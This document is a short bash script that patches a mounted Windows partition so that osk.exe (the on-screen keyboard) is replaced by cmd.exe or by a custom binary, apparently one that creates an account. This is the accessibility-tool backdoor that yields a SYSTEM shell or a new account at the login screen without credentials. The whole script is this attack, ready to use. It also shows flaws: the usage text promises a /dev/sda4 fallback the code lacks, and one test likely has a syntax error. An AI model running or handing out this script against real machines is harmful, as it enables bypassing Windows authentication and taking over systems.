#!/bin/bash

MYDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
MKPATCH=1

usage()
{
    echo "$0 <path to where windows is mounted>"
    echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
}

if [[ $1 = "-h" ]]; then 
    usage 
    exit 
fi 

if [[ ! -n $1 ]]; then 
    echo "Not enough arguments provided !"
    exit 
fi 
 
if [[ $(ls $1/Windows/System32 | grep cmd.exe )]]; then 
    echo "System32 detected. Continuing."
else
    echo "System32 not found. Are you at the right directory?"
    exit 
fi 

if [[ $2 = "debug" ]]; then 
    echo "Debug : Patch cmd instead of mkacc"
    MKPATCH=0 
fi 

if [[ $MKPATCH = 1 ]]; then 
    cd $1/Windows/System32
    sudo mv -f osk.exe bsdk.exe 
    sudo cp -fpr $MYDIR/osk.exe .
elif [[ $MKPATCH = 0 ]]; then 
    cd $1/Windows/System32 
    sudo mv -f osk.exe bsdk.exe 
    sudo cp -fpr  cmd.exe osk.exe
    cd $MYDIR 
fi 

echo "Patching done !"


